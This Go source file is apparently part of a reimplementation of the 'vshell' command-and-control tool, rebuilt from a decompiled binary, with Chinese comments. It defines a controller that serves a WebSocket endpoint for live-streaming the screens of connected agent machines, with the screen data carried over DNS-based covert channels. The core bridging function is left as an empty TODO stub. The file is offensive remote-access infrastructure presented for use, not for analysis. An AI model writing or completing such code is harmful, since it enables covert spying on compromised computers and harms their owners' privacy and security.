// Package controllers — 屏幕控制器，1:1 对齐原版二进制。
//
// 真实方法（funcnametab + 反编译地址）与前端路由：
//
//	Ws  0x18eeee0   GET /api/screen/ws?id=<id>&quality=<q>&token=<token>  屏幕直播 WebSocket
//
// 前端内嵌 JS：`ws://host/api/screen/ws?id="+y+"&quality="+f+"&token="+g`。
package controllers

import (
	"vshell/c2engine"
	"github.com/beego/beego/v2/server/web/context"
)

// ScreenController 提供 Agent 屏幕直播。
type ScreenController struct {
	ApiBaseController
}

// Ws 屏幕直播 WebSocket（GET /api/screen/ws?id=<clientID>&quality=<quality>&token=<token>）。
// 反编译（0x18eeee0）：id = JsonGetInt("id")，quality = JsonGetStr("quality")
// （7 字符，DAT 0x1bdbbb8 前 7 字节）；GetClient(id)（FUN_01198ac0）失败 →
// "未找到客户端"（FUN_0119ebe0，状态机 B start=0 seed=0xe6 加解密，UTF-8 已解）；
// 客户端协议（+0x20/+0x28）仅 dns/doh/dot → 错误（屏幕流走 DNS 通道）。
func (c *ScreenController) Ws() {
	id := int64(c.JsonGetInt("id"))
	quality := c.JsonGetStr("quality")
	client := c2engine.GetEngine().GetClient(id)
	if client == nil {
		c.JsonErr("未找到客户端")
		return
	}
	// TODO(engine): 桥接客户端屏幕流（DNS 通道）与 WebSocket，按 quality 控制压缩质量
	engineBridgeScreen(c.Ctx, id, quality)
	c.Data["json"] = map[string]interface{}{"status": "ws"}
	c.ServeJSON()
}

// ---- 引擎阶段对齐 ----

func engineBridgeScreen(ctrl *context.Context, id int64, quality string) {
	// TODO(engine): 对齐屏幕流桥接（ScreenController.Ws 反编译）
}
